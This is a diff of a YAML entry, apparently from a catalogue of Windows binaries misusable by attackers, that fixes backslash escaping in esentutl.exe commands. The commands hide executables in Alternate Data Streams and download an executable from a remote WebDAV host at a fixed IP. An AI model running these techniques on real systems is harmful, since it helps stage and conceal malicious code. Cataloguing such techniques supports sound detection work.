@@ -5,13 +5,13 @@ Author: ''
 Created: '2018-05-25'
 Categories: []
 Commands:
-  - Command: esentutl.exe /y C:\\folder\\sourcefile.vbs /d C:\\folder\\destfile.vbs /o
+  - Command: esentutl.exe /y C:\folder\sourcefile.vbs /d C:\folder\destfile.vbs /o
     Description: 'Copies the source VBS file to the destination VBS file.'
-  - Command: esentutl.exe /y C:\\ADS\\file.exe /d c:\\ADS\\file.txt:file.exe /o
+  - Command: esentutl.exe /y C:\ADS\file.exe /d c:\ADS\file.txt:file.exe /o
     Description: 'Copies the source EXE to an Alternate Data Stream (ADS) of the destination file.'
-  - Command: esentutl.exe /y C:\\ADS\\file.txt:file.exe /d c:\\ADS\\file.exe /o
+  - Command: esentutl.exe /y C:\ADS\file.txt:file.exe /d c:\ADS\file.exe /o
     Description: 'Copies the source Alternate Data Stream (ADS) to the destination EXE.'
-  - Command: esentutl.exe /y \\\\82.221.113.85\\webdav\\file.exe /d c:\\ADS\\file.txt:file.exe /o
+  - Command: esentutl.exe /y \\82.221.113.85\webdav\file.exe /d c:\ADS\file.txt:file.exe /o
     Description: 'Copies the source EXE to the destination Alternate Data Stream (ADS) of the destination file.'
   - Command: esentutl.exe /y \\82.221.113.85\webdav\file.exe /d c:\ADS\file.exe /o
     Description: 'Copies the source EXE to the destination EXE file.'
